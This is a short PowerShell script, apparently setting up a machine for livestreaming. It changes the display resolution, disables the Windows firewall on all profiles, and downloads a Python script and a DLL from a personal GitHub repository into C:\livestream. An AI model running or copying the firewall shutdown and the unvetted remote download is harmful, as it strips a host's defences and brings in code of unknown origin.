Set-DisplayResolution -Width 1920 -Height 1080 -Force
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

$folderPath = "C:\livestream"
$pythonScriptUrl = "https://raw.githubusercontent.com/singsangsingsang1/host/main/main.py"
$dllFileUrl = "https://github.com/singsangsingsang1/host/raw/main/LivestreamProcessor.dll"

New-Item -Path $folderPath -ItemType Directory -Force

Invoke-WebRequest -Uri $pythonScriptUrl -OutFile "$folderPath\main.py"

Invoke-WebRequest -Uri $dllFileUrl -OutFile "$folderPath\LivestreamProcessor.dll"
